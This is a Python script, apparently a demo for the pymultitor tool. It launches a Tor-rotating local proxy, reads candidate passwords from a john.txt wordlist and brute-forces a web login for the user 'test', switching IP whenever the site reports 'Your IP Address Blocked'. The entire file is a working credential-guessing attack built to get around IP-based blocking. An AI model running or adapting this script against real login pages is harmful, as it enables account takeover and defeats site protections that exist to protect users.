import socket
import requests
from os import path
from time import sleep
from multiprocessing import Process
from importlib.machinery import SourceFileLoader

__folder__ = path.dirname(__file__)


def check_pymultitor(address='127.0.0.1', port=8080):
    s = socket.socket()
    try:
        s.connect((address, port))
        return True
    except socket.error:
        return False


def execute_pymultitor():
    pymultitor_path = path.abspath(path.join(__folder__, '..', 'pymultitor.py'))
    pymultitor_module = SourceFileLoader('pymultitor', pymultitor_path).load_module("pymultitor")
    process = Process(target=pymultitor_module.main, kwargs={
        'args': ['-d', '-p', '5', '--on-string', 'Your IP Address Blocked']
    })
    process.start()

    while not check_pymultitor():
        sleep(1)

    return process


def iter_passwords():
    with open(path.join(__folder__, 'john.txt')) as credentials_file:
        for i, credentials in enumerate(credentials_file):
            yield credentials.rstrip('\n').split(':')[-1]


def auth(username, password, session=requests.Session()):
    res = session.post(
        url='http://multitor.realgame.co.il/login',
        data={
            'username': username,
            'password': password,
        },
        proxies={'http': '127.0.0.1:8080'}
    )
    if str.encode('Successfully login!') in res.content:
        return True
    return False


if __name__ == '__main__':
    process = execute_pymultitor()

    username = 'test'
    for password in set(iter_passwords()):
        if auth(username, password):
            print("Username: %s, Password: %s -> Success :)" % (username, password))
            break
        else:
            print("Username: %s, Password: %s -> Fail :(" % (username, password))

    process.terminate()
    process.join()
